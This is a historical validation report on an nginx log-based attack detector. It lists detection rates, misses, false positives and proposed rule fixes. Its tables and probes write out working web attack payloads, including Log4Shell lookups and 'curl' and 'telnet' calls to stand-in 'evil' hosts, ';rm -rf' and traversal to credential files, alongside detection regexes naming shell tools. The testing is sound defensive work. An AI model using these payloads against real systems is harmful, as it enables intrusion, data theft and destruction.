# nginx-thresh — Adversarial Validation Report

> Historical review. This was run before the detection hardening pass; the false positives and false negatives below were addressed afterwards. See `docs/validation-after.md` for the post-fix results and the current README for present behaviour.

**Target:** `/home/seun/nginx-thresh`, release binary `target/release/thresh` (v0.1.0, built 2026-11-12 12:09)
**Date:** 2026-11-12
**Mode:** read-only validation. No changes were made to `src/`, `tests/`, `Cargo.toml`, `README` or any other document; this file is the only deliverable.
**Invocation used throughout:** `thresh <case>.log --no-color --top 100` (defaults otherwise: window 300 s, threshold 20, max events 250 000, auto threads = 12).

---

## 1. Executive summary

| Metric | Result |
|---|---|
| Core attack payloads | **57** |
| Detected (≥1 event, expected category present) | **51 (89.5 %)** |
| Missed (false negatives) | **6 (10.5 %)** |
| Benign lookalikes tested | **20** |
| Clean (zero events) | **15 (75 %)** |
| Flagged (false positives) | **5 (25 %)** — 4 CRITICAL `SSRF-001`, 1 MEDIUM `RECON-008` |
| `BF-001` brute-force correlation | **PASS** (20 and 25 × 401 within window; 19 does not fire) |
| `SCAN-001` scan correlation | **PASS only after tuning** — 30 distinct 404s do **not** fire at defaults (effective threshold is 40, not 25/30); fires with `--threshold 10` |
| Event volume | 57 requests produced **136 events** (2.39 per request, max 8 on one line) |
| Rule inventory in this build | **119 distinct rule IDs** (`RECON-013` absent). The brief cites 126; 7 IDs are not present in this checkout |

**Highest-impact findings, in order:**

1. **`SSRF-001` is a critical-severity false-positive generator.** Any absolute `http(s)://` URL in ~30 common parameter names (`next`, `return_url`, `redirect`, `url`, `image`, …) fires at severity 7; with a 200 response the score is **8.75 → CRITICAL**. Four of twenty benign lookalikes and 20 of 200 realistic benign requests were flagged by this single rule.
2. **`LOG4SHELL-004/006` miss the canonical nested-lookup bypass** `${${lower:j}ndi:rmi://…}`. Zero events on a payload that exploits CVE-2021-44228 trivially.
3. **`CMDI-001` is an allowlist of 15 command names**; `;rm -rf`, `;shutdown`, `;telnet`, `;base64` and every other unlisted command pass undetected.
4. **SQLi detection is literal and brittle**: a bare `'`, `1--`, `1#`, `1 OR 2=2`, `UN/**/ION SEL/**/ECT`, and MySQL versioned comments all return 0 events.
5. **Header scopes are mostly uninspected.** Only Log4Shell has `User-Agent`/`Referer` rules (plus the scanner-UA rule `RECON-012`); SQLi, XSS and traversal in headers are invisible.
6. **`WEBSHELL-004` flags any `?cmd=<anything>` at severity 9** — `?cmd=download` scores **11.25 CRITICAL** on a normal media-player URL.
7. **`SCAN-001`'s default threshold is 40 distinct paths**, not the 25/30 an operator would infer from the code comment and CLI help (`max(2 × --threshold, 25)`).

What works well: percent-decoding and double-decoding, case folding, SQLi keyword detection, XSS tags/handlers, webshell sinks, Log4Shell encoded/bare forms, recon UAs/methods, sensitive-file rules, null-byte/CRLF/malformed-request checks, JSON and vhost/common layouts, and both stateful detectors' core logic.

---

## 2. Methodology

### 2.1 Harness

A Python harness outside the repository (`/home/seun/.hermes/cache/scratch/adversarial/harness.py`) generates minimal one-line nginx logs for each payload and runs the release binary. Every case uses a distinct source IP so brute-force/scan correlation cannot contaminate single-line results.

Line layouts exercised:

- **combined** — `IP - - [12/Nov/2026:10:00:00 +0000] "METHOD TARGET HTTP/1.1" STATUS 1234 "REFERER" "USER-AGENT"`
- **common** — same without referer/UA (one traversal case)
- **JSON** — `{"remote_addr":…,"time_local":…,"request":…,"status":…,"http_referer":…,"http_user_agent":…,"host":…}` (and `request_uri`/`request_method` variant)
- **vhost combined** — leading virtual-host token (one case)

For each run the harness parses:

- `Threats  N suspicious events  ·  M unique offending IPs` from EXECUTIVE SUMMARY;
- every line of CATEGORY BREAKDOWN (label + count);
- every `TOP THREATS` detail line, extracting `rule_name (RULE-ID)`.

Two parsing caveats that shape the tables below:

1. The TOP THREATS list is **deduplicated per `(source_ip, line_no)`**, so a one-line log with six rule hits shows **one** row (the highest-scoring rule) while the headline reports six events. Full per-rule attribution is therefore read from category counts plus the rule regexes; the `top rule` column in the tables is the highest-ranked rule actually printed.
2. Category counts are **per rule hit**, not per request. One payload can increment several categories (e.g. traversal also trips LFI rules).

### 2.2 Corpora

| Corpus | Size | Purpose |
|---|---|---|
| Core attack payloads | 57 | Task-specified traversal/LFI/SQLi/CMDi/Log4Shell/XSS/SSRF/webshell/recon/header/JSON cases plus encoding variants |
| Benign lookalikes | 20 | Task-specified clean traffic + three extras (`/index.php?page=2`, `javascript framework` search, `how to go back again` search) |
| Correlation scenarios | 11 | `BF-001`/`SCAN-001` thresholds, windows, and false-positive shapes |
| Aggregate runs | 2 | All attack lines in one log; all benign lines + 8 ordinary 404s in one log |
| Extended probes | 53 | Extra adversarial variants, parser/malformed cases, calibration and FP probes (waves 2/4/5) |

A case is a **true positive** when it produces ≥1 event *and* the expected category appears. It is a **false negative** when it produces zero events or only unrelated categories. For benign cases any event is a **false positive**, graded by the emitted score.

### 2.3 Reproduce

```bash
cd /home/seun/nginx-thresh
./target/release/thresh <case>.log --no-color --top 100
python3 /home/seun/.hermes/cache/scratch/adversarial/harness.py   # core corpus + aggregates
python3 /home/seun/.hermes/cache/scratch/adversarial/wave2.py     # calibration / encoding probes
```

Case logs are preserved under `/home/seun/.hermes/cache/scratch/adversarial/cases/` and raw parsed results in `results.json`, `wave2.json`, `wave4.json`, `wave5.json`.

---

## 3. Results

### 3.1 Detection rate by family

| Family | Detected / tested | Rate | Misses |
|---|---|---|---|
| Path Traversal | 8 / 10 | 80 % | overlong UTF-8; traversal in Referer |
| Local File Inclusion | 4 / 4 | 100 % | — |
| SQL Injection | 9 / 11 | 82 % | `/**/`-split keywords; SQLi in User-Agent |
| Command Injection | 8 / 8 | 100 % | (but see whitelist gaps below) |
| Log4Shell | 5 / 6 | 83 % | canonical nested lookup |
| XSS | 3 / 4 | 75 % | script tag in Referer |
| SSRF | 5 / 5 | 100 % | — |
| Webshell | 3 / 3 | 100 % | — |
| Reconnaissance | 5 / 5 | 100 % | — |
| Sensitive File Access | 1 / 1 | 100 % | — |

These rates cover hand-picked payloads, not a statistically representative sample. The extended probes deliberately target evasion and expose more gaps than the core corpus.

### 3.2 Core attack corpus (57 payloads)

`Events` is the headline count (all rule hits). `Categories` shows `label (count)`. `Top rule` is the highest-ranked rule printed in TOP THREATS.

| ID | Payload (context) | Det. | Categories (count) | Events | Top rule / note |
|---|---|:--:|---|--:|---|
| trav-01 | <code>/..%2f..%2fetc/passwd</code> | Y | Path Traversal (5); Local File Inclusion (1) | 6 | top <code>LFI-003</code> |
| trav-02 | <code>/%2e%2e%2f%2e%2e%2fetc/passwd</code> | Y | Path Traversal (5); Local File Inclusion (1) | 6 | top <code>LFI-003</code> |
| trav-03 | <code>/%252e%252e%252fetc%252fpasswd</code> | Y | Path Traversal (4); Local File Inclusion (1) | 5 | top <code>LFI-003</code> |
| trav-04 | <code>/....//....//etc/passwd</code> | Y | Path Traversal (5); Local File Inclusion (1) | 6 | top <code>LFI-003</code> |
| trav-05 | <code>/..%5c..%5cwindows%5cwin.ini</code> | Y | Path Traversal (4) | 4 | top <code>TRAV-006</code> |
| trav-06 | <code>/etc/passwd%00.png</code> | Y | Malformed Request (2); Local File Inclusion (1); Path Traversal (1) | 4 | top <code>LFI-003</code> |
| trav-07 | <code>/..%c0%af..%c0%afetc/passwd</code> | N | — | 0 | FN — overlong UTF-8 <code>%c0%af</code> not normalized |
| trav-08 | <code>/%2e%2e%2f%2e%2e%2fetc%2fpasswd</code> | Y | Path Traversal (5); Local File Inclusion (1) | 6 | top <code>LFI-003</code> |
| lfi-01 | <code>/?page=php://filter/convert.base64-encode/resource=index</code> | Y | Local File Inclusion (2) | 2 | top <code>LFI-001</code> |
| lfi-02 | <code>/?file=..%2f..%2f..%2fproc%2fself%2fenviron</code> | Y | Path Traversal (5); Local File Inclusion (3) | 8 | top <code>LFI-002</code> |
| lfi-03 | <code>/?include=/etc/shadow</code> | Y | Local File Inclusion (2); Path Traversal (1) | 3 | top <code>LFI-002</code> |
| lfi-04 | <code>/?page=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex</code> | Y | Local File Inclusion (3) | 3 | top <code>LFI-001</code> |
| sqli-01 | <code>/?id=1%27%20OR%20%271%27=%271</code> | Y | SQL Injection (1) | 1 | top <code>SQLI-004</code> |
| sqli-02 | <code>/?id=1%20UN/**/ION%20SEL/**/ECT%20password%20FROM%20users</code> | N | — | 0 | FN — <code>/**/</code> splits UNION/SELECT keywords |
| sqli-03 | <code>/?id=%31%20AND%20%31=%31</code> | Y | SQL Injection (1) | 1 | top <code>SQLI-005</code> |
| sqli-04 | <code>/?q=1%3BSLEEP%285%29</code> | Y | SQL Injection (1) | 1 | top <code>SQLI-006</code> |
| sqli-05 | <code>/?q=1%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--</code> | Y | SQL Injection (2) | 2 | top <code>SQLI-007</code> |
| sqli-06 | <code>/?q=1%20AND%20BENCHMARK%281000000,MD5%281%29%29</code> | Y | SQL Injection (1) | 1 | top <code>SQLI-006</code> |
| sqli-07 | <code>/?q=1%20UNION%20SELECT%20@@version</code> | Y | SQL Injection (1) | 1 | top <code>SQLI-001</code> |
| sqli-08 | <code>/?id=1%27/**/OR/**/1=1</code> | Y | SQL Injection (1) | 1 | top <code>SQLI-014</code> |
| sqli-09 | <code>/?id=1%09or%091%3D1</code> | Y | SQL Injection (1) | 1 | top <code>SQLI-003</code> |
| cmdi-01 | <code>/?host=127.0.0.1%3Bcat%20/etc/passwd</code> | Y | Command Injection (1); Local File Inclusion (1); Path Traversal (1); SSRF (1) | 4 | top <code>CMDI-001</code> |
| cmdi-02 | <code>/?host=127.0.0.1%3Bcat%24%7BIFS%7D/etc/passwd</code> | Y | Command Injection (2); Local File Inclusion (1); Path Traversal (1); SSRF (1) | 5 | top <code>CMDI-001</code> |
| cmdi-03 | <code>/?x=%7Cid</code> | Y | Command Injection (1) | 1 | top <code>CMDI-001</code> |
| cmdi-04 | <code>/?x=%60id%60</code> | Y | Command Injection (1) | 1 | top <code>CMDI-002</code> |
| cmdi-05 | <code>/?x=%24%28whoami%29</code> | Y | Command Injection (1) | 1 | top <code>CMDI-003</code> |
| cmdi-06 | <code>/?x=%0Acat%20/etc/passwd</code> | Y | Command Injection (1); Local File Inclusion (1); Path Traversal (1) | 3 | top <code>CMDI-008</code> |
| cmdi-07 | <code>/?x=%3Bcurl%24%7BIFS%7Dhttp://evil.example</code> | Y | Command Injection (2) | 2 | top <code>CMDI-001</code> |
| cmdi-08 | <code>/?x=1%3B%20cat%20/etc/passwd</code> | Y | Command Injection (1); Local File Inclusion (1); Path Traversal (1) | 3 | top <code>CMDI-001</code> |
| log4j-01 | <code>/?x=%24%7Bjndi:ldap://evil/a%7D</code> | Y | Log4Shell (5) | 5 | top <code>LOG4SHELL-001</code> |
| log4j-02 | <code>/?x=%24%7B%24%7Blower:j%7Dndi:rmi://evil/b%7D</code> | N | — | 0 | FN — canonical nested <code>${${lower:j}ndi:…}</code> bypass |
| log4j-03 | <code>/ · UA: ${jndi:dns://evil/c}</code> | Y | Log4Shell (1) | 1 | top <code>LOG4SHELL-007</code> |
| log4j-04 | <code>/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D</code> | Y | Log4Shell (5) | 5 | top <code>LOG4SHELL-001</code> |
| xss-01 | <code>/?q=%3Cscript%3Ealert(1)%3C/script%3E</code> | Y | XSS (3) | 3 | top <code>XSS-001</code> |
| xss-02 | <code>/?q=%3Csvg/onload=alert(1)%3E</code> | Y | XSS (3) | 3 | top <code>XSS-007</code> |
| xss-03 | <code>/?q=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E</code> | Y | XSS (2) | 2 | top <code>XSS-004</code> |
| ssrf-01 | <code>/?url=http://169.254.169.254/latest/meta-data/</code> | Y | SSRF (3) | 3 | top <code>SSRF-005</code> |
| ssrf-02 | <code>/?url=http%3A%2F%2Flocalhost%2Fadmin</code> | Y | SSRF (3); Reconnaissance (1) | 4 | top <code>SSRF-009</code> |
| ssrf-03 | <code>/?target=file:///etc/passwd</code> | Y | Local File Inclusion (1); Path Traversal (1); SSRF (1) | 3 | top <code>LFI-003</code> |
| ssrf-04 | <code>/?callback=http://metadata.google.internal/</code> | Y | SSRF (2) | 2 | top <code>SSRF-005</code> |
| ssrf-05 | <code>/?url=http://2130706433/</code> | Y | SSRF (2) | 2 | top <code>SSRF-008</code> |
| web-01 | <code>/shell.php?cmd=id</code> | Y | Webshell (2) | 2 | top <code>WEBSHELL-001</code> |
| web-02 | <code>/upload.php?exec=whoami</code> | Y | Webshell (2) | 2 | top <code>WEBSHELL-001</code> |
| web-03 | <code>/?x=eval(base64_decode('ZWNobyAx'))</code> | Y | Webshell (1) | 1 | top <code>WEBSHELL-002</code> |
| recon-01 | <code>/ · UA: sqlmap/1.8</code> | Y | Reconnaissance (1) | 1 | top <code>RECON-012</code> |
| recon-02 | <code>/ · UA: Nikto/2.5.0</code> | Y | Reconnaissance (1) | 1 | top <code>RECON-012</code> |
| recon-03 | <code>PROPFIND /dav/</code> | Y | Reconnaissance (1) | 1 | top <code>RECON-015</code> |
| recon-04 | <code>/.git/config</code> | Y | Sensitive File Access (1) | 1 | top <code>SENS-002</code> |
| recon-05 | <code>/server-status</code> | Y | Reconnaissance (1) | 1 | top <code>RECON-002</code> |
| recon-06 | <code>/actuator/env</code> | Y | Reconnaissance (1) | 1 | top <code>RECON-003</code> |
| hdr-01 | <code>/ · UA: Mozilla/5.0 ' OR 1=1--</code> | N | — | 0 | FN — SQLi rules are target-scope only |
| hdr-02 | <code>/ · Ref: ${jndi:ldap://evil/x}</code> | Y | Log4Shell (1) | 1 | top <code>LOG4SHELL-008</code> |
| hdr-03 | <code>/ · UA: Mozilla/5.0 · Ref: http://evil.example/../../etc/passwd</code> | N | — | 0 | FN — no traversal rule on Referer |
| hdr-04 | <code>/ · Ref: http://evil.example/?q=&lt;script&gt;alert(1)&lt;/script&gt;</code> | N | — | 0 | FN — no XSS rule on Referer |
| json-01 | <code>JSON · /?id=1%20UNION%20SELECT%20password%20FROM%20users</code> | Y | SQL Injection (1) | 1 | top <code>SQLI-001</code> |
| json-02 | <code>JSON · / · UA: ${jndi:ldap://evil/x}</code> | Y | Log4Shell (1) | 1 | top <code>LOG4SHELL-007</code> |
| json-03 | <code>JSON · /download?file=..%2f..%2fetc%2fpasswd</code> | Y | Path Traversal (5); Local File Inclusion (2) | 7 | top <code>LFI-002</code> |

### 3.3 Benign corpus (20 lookalikes)

| ID | Request | Flagged | Rule | Score | Assessment |
|---|---|---|---|---|---|
| ben-01 | `/search?q=union+station+coffee` | N | — | — | correct |
| ben-02 | `/search?q=select+a+size+from+the+list` | N | — | — | correct |
| ben-03 | `/download?file=manual.pdf` | N | — | — | correct |
| ben-04 | `/download?file=report-2026.pdf` | N | — | — | correct |
| ben-05 | `/checkout?next=https://shop.example.com/checkout` | **Y** | `SSRF-001` | **8.75 CRITICAL** | false positive — public absolute URL |
| ben-06 | `/account?return_url=https://shop.example.com/account` | **Y** | `SSRF-001` | **8.75 CRITICAL** | false positive — public absolute URL |
| ben-07 | `/start?redirect=https://docs.example.com/start` | **Y** | `SSRF-001` | **8.75 CRITICAL** | false positive — open-redirect surface, not SSRF |
| ben-08 | `/img?url=https://cdn.example.com/image.png` | **Y** | `SSRF-001` | **8.75 CRITICAL** | false positive — CDN image proxy |
| ben-09 | `/blog/2026/understanding-path-traversal` | N | — | — | correct |
| ben-10 | `/wp-content/uploads/2026/05/hero.jpg` | N | — | — | correct |
| ben-11 | `/wp-json/wp/v2/posts?per_page=10` | N | — | — | correct |
| ben-12 | `/api/users/42` | N | — | — | correct |
| ben-13 | `/products?sort=price&order=desc` | N | — | — | correct |
| ben-14 | `GET /` UA Googlebot | N | — | — | correct |
| ben-15 | `GET /health` UA `curl/8.7.1` | N | — | — | correct |
| ben-16 | `/search?q=blue+%20shoes&page=2` | N | — | — | correct (`+` and `%20` handled) |
| ben-17 | `/admin` GET 200, browser UA | **Y** | `RECON-008` | 3.75 MEDIUM | acceptable low-severity recon, but volume risk |
| ben-18 | `/index.php?page=2` | N | — | — | correct |
| ben-19 | `/search?q=javascript+framework+comparison` | N | — | — | correct |
| ben-20 | `/search?q=how+to+go+back+again` | N | — | — | correct |

**Realistic benign log:** 200 ordinary requests (product/blog/search/API/asset pages, outbound redirect links, `/admin`, `/wp-login.php`, `/graphql`, `/swagger-ui`, `/player?cmd=…`, `/cart?cmd=…`, Googlebot/curl) produced **60 events from 60 IPs**:

```
Threats      60 suspicious events  ·  60 unique offending IPs
CATEGORY BREAKDOWN
Reconnaissance            25
SSRF                      20
Webshell                  15
```

That is a 30 % request-level false-positive rate, and the top of the ranked list is filled with 11.25-score `WEBSHELL-004` hits. Only 12 of 40 distinct URL shapes were responsible, but normal traffic repeats them constantly.

### 3.4 Stateful correlation

| Scenario | Observed | Verdict |
|---|---|---|
| 25 × `401 POST /login` within 24 s (defaults) | 1 event, `BF-001`, `25 failed logins in 300s`, score 7.00 | **PASS** |
| 19 × 401 | 0 events | PASS (below threshold 20) |
| 20 × 401 | 1 event `BF-001` | PASS (boundary) |
| 25 × 401 spread over 240 s, `--window 60` | 0 events | PASS (window honored) |
| 25 × 401 spread over 240 s, default window 300 | 1 event `BF-001` | PASS |
| 25 × 401 on **25 distinct `/api/v1/orders/N` endpoints** | 1 event `BF-001`, score 7.00, evidence “25 failed logins” | **FP risk** (expired-token client; no login path involved) |
| **30 distinct 404 paths within 30 s, defaults** | **0 events** | **FAIL vs expectation** — effective threshold is 40 |
| 30 distinct 404 paths, `--threshold 10` | 1 event `SCAN-001`, `30 distinct 404/403 paths in 300s` | PASS |
| 40 distinct 404 paths, defaults | 1 event `SCAN-001` | PASS |
| 24 distinct 404 paths, `--threshold 5` | 0 events | PASS (25-path floor) |
| 25 × 401 + 30 distinct 404 from one IP, `--threshold 10` | 2 events, `BF-001` + `SCAN-001` | PASS |

`SCAN-001` calibration detail: `scan_threshold = max(threshold × 2, 25)`. With the documented default `--threshold 20`, an operator needs **40** distinct 404/403 paths to trigger, despite the constant being named `SCAN_MIN_DISTINCT = 25`. The task's 30-path case therefore produces “No suspicious activity detected” at defaults.

```
$ thresh corr-scan-30-default.log --no-color --top 3
  Threats      0 suspicious events  ·  0 unique offending IPs
  │ ✓  No suspicious activity detected.                      │

$ thresh corr-scan-30-t10.log --no-color --threshold 10 --top 3
  Threats      1 suspicious events  ·  1 unique offending IPs
  #1   5.00   …  203.0.113.80  Reconnaissance  404
    ↳ GET /probe/0
      Directory and endpoint enumeration (SCAN-001) · 30 distinct 404/403 paths in 300s (peak win…
```

### 3.5 Extended probes (selected)

| Probe | Payload / scenario | Observed | Assessment |
|---|---|---|---|
| <code>sqli-quote-only</code> | <code>/?id=1'</code> | 0 | FN — no bare-quote rule |
| <code>sqli-dash-noquote</code> | <code>/?id=1--</code> | 0 | FN — <code>SQLI-014</code> requires a quote |
| <code>sqli-hash-noquote</code> | <code>/?id=1#</code> | 0 | FN — same |
| <code>sqli-num-2=2</code> | <code>/?id=1 OR 2=2</code> | 0 | FN — tautology hard-coded to <code>1=1</code> |
| <code>sqli-comment-split</code> | <code>/?id=1 UN/**/ION SEL/**/ECT 1</code> | 0 | FN — no comment normalization |
| <code>sqli-versioned-comment</code> | <code>/?id=1 /*!50000UNION*/ SELECT 1</code> | 0 | FN — versioned comment not stripped |
| <code>log4j-nested-1</code> | <code>/?x=${${lower:j}ndi:ldap://evil/a}</code> | 0 | **FN (P0)** — canonical bypass |
| <code>log4j-nested-3</code> | <code>/?x=${jndi:${lower:l}dap://evil/a}</code> | 3 events, <code>LOG4SHELL-002</code> | partial — encoded rule catches |
| <code>cmdi-rm</code> | <code>/?x=;rm -rf /var/www</code> | 0 | FN — <code>rm</code> not in <code>CMDI-001</code> allowlist |
| <code>cmdi-shutdown</code> | <code>/?x=;shutdown -h now</code> | 0 | FN — not in allowlist |
| <code>cmdi-telnet</code> | <code>/?x=;telnet evil 444</code> | 0 | FN — not in allowlist |
| <code>trav-overlong</code> | <code>/..%c0%af..%c0%afetc/passwd</code> | 0 | FN — overlong UTF-8 |
| <code>trav-dotdot-semicolon-generic</code> | <code>/..;/..;/config.php</code> | 0 | FN — no <code>..;</code> rule |
| <code>xss-touchmove</code> | <code>/?q=&lt;div ontouchmove=alert(1)&gt;</code> | 0 | FN — handler list gap |
| <code>referer-sqli</code> | <code>Ref http://evil/?id=1' OR '1'='1</code> | 0 | FN — header scope |
| <code>benign-cmd-download</code> | <code>/player?cmd=download</code> | 1 event, <code>WEBSHELL-004</code>, 11.25 | **FP** — UI parameter |
| <code>benign-report-old</code> | <code>/download?file=release-notes.old</code> | 1 event, <code>SENS-015</code>, 5.00 | **FP** — backup-suffix heuristic |
| <code>benign-wp-login</code> | <code>/wp-login.php</code> | 1 event, <code>RECON-009</code>, 3.75 | accepted low-sev |
| <code>benign-graphql</code> | <code>/graphql</code> | 1 event, <code>RECON-005</code>, 3.75 | accepted low-sev |
| <code>ssrf-127-1</code> | <code>/?url=http://127.1/</code> | 1 event, <code>SSRF-001</code> only | host rules miss short-form loopback |
| <code>bf-25-distinct-401</code> | <code>25 × 401 on distinct /api/v1/orders/N</code> | 1 event, <code>BF-001</code>, 7.00 | **FP risk** — expired-token client |
| <code>scan-40-403-assets</code> | <code>40 × 403 static /assets/private/N.jpg</code> | 1 event, <code>SCAN-001</code>, 5.00 | **FP risk** — signed-URL policy |
| <code>scan-30-default-w60</code> | <code>30 distinct 404, --window 60</code> | 0 | threshold 40 &gt; 30 |
| <code>bf-25-240s-w60</code> | <code>25 × 401 over 240 s, --window 60</code> | 0 | correct — outside window |
| <code>bf-25-240s-w300</code> | <code>25 × 401 over 240 s, default window</code> | 1 event, <code>BF-001</code> | correct — inside 300 s |
| <code>proto-bad</code> | <code>"GET / HTTP/9.9"</code> | 1 event, <code>MALF-001</code> | parser check passes |
| <code>method-bad</code> | <code>"GE\|T / HTTP/1.1"</code> | 1 event, <code>MALF-002</code> | parser check passes |
| <code>long-target</code> | <code>5 000-byte request target</code> | 1 event, <code>MALF-004</code> | parser check passes |
| <code>vhost-trav</code> | <code>vhost combined GET /../../etc/passwd</code> | 5 events, <code>LFI-003</code> top | vhost layout works |
| <code>json-request_uri</code> | <code>JSON request_uri + request_method</code> | 7 events, <code>LFI-002</code> top | JSON variant works |

---

## 4. False-negative analysis

### FN-1 — Log4Shell nested lookup bypass (P0, rule gap)

Payload (percent-encoded in the log target): `/?x=${${lower:j}ndi:rmi://evil/b}`

Observed: **0 events**, `✓ No suspicious activity detected.` This is the canonical CVE-2021-44228 obfuscation: `${lower:j}` expands to `j`, yielding `jndi:rmi://…`.

Cause: `LOG4SHELL-004` is `\$\{(?:lower|upper|::-)[^}]*\$\{` — it expects `${lower…${`, while the payload is `${${lower…`. `LOG4SHELL-006` is `\$\{[^}]*jndi:` — `[^}]*` cannot cross the `}` that closes `${lower:j}`, so the literal `jndi:` after it is never seen. `LOG4SHELL-001/002/003` require a contiguous `jndi:` or `%24%7bjndi`, which the nesting breaks.

Note: a related variant `${${env:NaN:-j}ndi:ldap://…}` *was* caught — but only incidentally by `LOG4SHELL-005` (`${env:`), not by a JNDI rule. `${${lower:j}…}` contains no `env:` and is completely invisible.

Fix: add a rule for a nested lookup followed by a JNDI scheme, e.g.
`\$\{[^}]*\}\s*(?:j?ndi):(?:ldap|rmi|dns|http|https|iiop)` (severity 10), plus a cheap `${${` “nested lookup” rule, and/or bounded deobfuscation of `${lower:X}`/`${upper:X}`/`${env:*:-X}` before matching.

### FN-2 — SQLi literal/obfuscation gaps (P1, rule gap)

| Probe | Observed | Why |
|---|---|---|
| `/?id=1'` (classic probe) | 0 events | No rule for a bare quote; `SQLI-014` needs digit+quote+comment |
| `/?id=1--` | 0 events | `SQLI-014` = `\d['"]\s*(?:--\|#\|/\*)`, requires the quote |
| `/?id=1#` | 0 events | same |
| `/?id=1 OR 2=2` | 0 events | `SQLI-003/005` hard-code `1=1` |
| `/?id=1 UN/**/ION SEL/**/ECT password FROM users` | 0 events | `/**/` splits `UNION` and `SELECT`; no comment normalisation |
| `/?id=1 /*!50000UNION*/ SELECT 1` | 0 events | MySQL versioned comment not stripped |
| `/?id=1'/**/OR/**/1=1` | **detected** (`SQLI-014`) | only by accident: `'` followed by `/*` |

Cause: patterns match literal keywords and literal tautologies against a decoded-but-not-normalised target. Inline comments are a standard WAF bypass; a numeric tautology with literals other than `1=1` is equally standard.

Fix: build a small SQL normalisation view (strip `/**/`, `/*!…*/` and collapse whitespace) and scan `SQLI-001/002/003/005` against it; add `\b\d+\s*(?:--|#)` (severity 4), `\b\d+\s+(?:or|and)\s+\d+\s*=\s*\d+` (severity 4) and a numeric-value quote rule `[?&][a-z0-9_.-]+=\d+'` (severity 3, informational).

### FN-3 — Header scopes are uninspected (P1, scope gap)

| Probe | Observed |
|---|---|
| UA `Mozilla/5.0 ' OR 1=1--` | 0 events |
| Referer `http://evil.example/?id=1' OR '1'='1` | 0 events |
| Referer `http://evil.example/../../etc/passwd` | 0 events |
| Referer `http://evil.example/?q=<script>alert(1)</script>` | 0 events |
| UA `${jndi:dns://evil/c}` | detected (`LOG4SHELL-007`) |
| Referer `${jndi:ldap://evil/x}` | detected (`LOG4SHELL-008`) |

Cause: `Scope` is fixed per rule; only the Log4Shell family and `RECON-012` (scanner UA) register `UserAgent`/`Referer` patterns; `MALF-003` only looks for CRLF. SQLi, XSS and traversal families scan only `RawPath`/`Target`.

Impact: lower than query-string injection because UA/Referer are rarely reflected server-side, but these are still attacker-controlled strings that land in logs and downstream SIEMs. `MALF-003` catches CRLF header injection, which is a different problem.

Fix: add dedicated low/medium-severity header rules (e.g. `SQLI-UA-001`, `SQLI-REF-001` at severity 6; `TRAV-REF-001`; `XSS-REF-001` at severity 4) rather than re-running the full target scope, to avoid flagging benign UAs that mention `select` or `<script>` in documentation links.

### FN-4 — Command-injection allowlist (P1, rule gap)

| Probe | Observed |
|---|---|
| `/?x=;rm -rf /var/www` | **0 events** |
| `/?x=;shutdown -h now` | **0 events** |
| `/?x=;telnet evil 444` | **0 events** |
| `/?x=;cat${IFS}/etc/passwd` | detected (`CMDI-001`, `CMDI-011`) |
| `/?x=;bash -c "$(echo aWQ=)"` | detected (`CMDI-001`) |

Cause: `CMDI-001` matches `(?:;|\||&&|\|\|)\s*(?:/bin/|/usr/bin/)?(?:cat|ls|id|whoami|uname|wget|curl|nc|netcat|bash|sh|python…|perl|powershell|cmd)\b`. Anything outside that 15-name list is invisible unless another rule happens to fire. `rm`, `shutdown`, `telnet`, `dd`, `socat`, `base64` and `mkfifo` are all missing. The `${IFS}` obfuscation called out in the brief **is** already covered by `CMDI-011` and works (`;cat${IFS}/etc/passwd` is detected); the gap is command coverage, not separator coverage.

Fix: extend the alternation with high-value commands (`rm|mv|cp|dd|mkfifo|kill|pkill|shutdown|reboot|halt|telnet|ssh|scp|ftp|tftp|dig|nslookup|base64|xxd|socat|chmod|chown|tar|zip|unzip|nohup|env|find|xargs`), or add a second rule for separator + shell-metacharacter-rich value (with a `jsessionid`-style exclusion to protect matrix parameters).

### FN-5 — Traversal obfuscation (P2, encoding + rule gap)

| Probe | Observed |
|---|---|
| `/..;/..;/config.php` | 0 events |
| `/..%c0%af..%c0%afetc/passwd` (overlong UTF-8) | 0 events |
| `/..;/..;/etc/passwd` | detected — but only because `/etc/passwd` trips `TRAV-007`/`LFI-003` |
| `/.../.../etc/passwd` | detected — same reason |

Cause: no pattern for the `..;` path-parameter bypass and no overlong-UTF-8 normalisation (`%c0%ae`, `%c0%af`, `%c1%9c` decode to invalid UTF-8 and are replaced with U+FFFD, so no `../` ever appears). Semicolon/ellipsis variants only surface when they happen to name a sensitive file directly.

Fix: add `\.\.;` (severity 6) and raw-scope `%c0%ae|%c0%af|%c1%9c` (severity 6); optionally normalise overlong sequences before the decode pass.

### FN-6 — XSS event-handler list is closed (P2, rule gap)

`/?q=<div ontouchmove=alert(1)>` → 0 events. `/?q=<img src=x onpointerdown=alert(1)>` was flagged only because the **encoded** `<img` tripped `XSS-009`; the plain form would miss. `XSS-004` lists 26 handlers but omits `pointerdown`, `pointerup`, `pointermove`, `touchmove`, `animationiteration`, `transitionrun`, `beforetoggle`.

Fix: extend the handler alternation (or use `\bon(?:pointer|touch|animation|transition|drag|drop|paste|focus|blur|click|error|load|mouse)[a-z]*\s*=`).

### FN-7 — Threshold expectations for `SCAN-001` (P1, calibration)

Not an evasion, but a functional false negative against the stated expectation: 30 distinct 404 paths in 60 s does not fire at defaults because `--threshold 20` is doubled (→ 40) and floored at 25. Either document “40 distinct paths at defaults” or decouple the scan threshold from the brute-force threshold (see fix list).

---

## 5. False-positive analysis

### FP-1 — `SSRF-001`: every public absolute URL is “critical” (P0)

Exact payloads and output:

```
$ thresh ben-ben-08.log --no-color --top 100
  Threats      1 suspicious events  ·  1 unique offending IPs
  Severity     CRITICAL 1 (>=8) · HIGH 0 (6-7.99) · MEDIUM 0 (<6)
  SSRF                        1
  #1   8.75   2026-11-12 10:00:00  198.18.0.8  SSRF  200
    ↳ GET /img?url=https://cdn.example.com/image.png
      URL parameter with an absolute URL (SSRF-001) · pattern ssrf_url_param in '/img?url=https:/…
```

Rule: `SSRF-001` = `[?&](?:url|uri|dest|destination|redirect|redirect_uri|next|target|proxy|fetch|callback|callback_url|return|returnurl|return_url|image|img|src|source|webhook|feed|host|site|link|domain|continue|goto|open|out|view)=https?://`, severity 7.

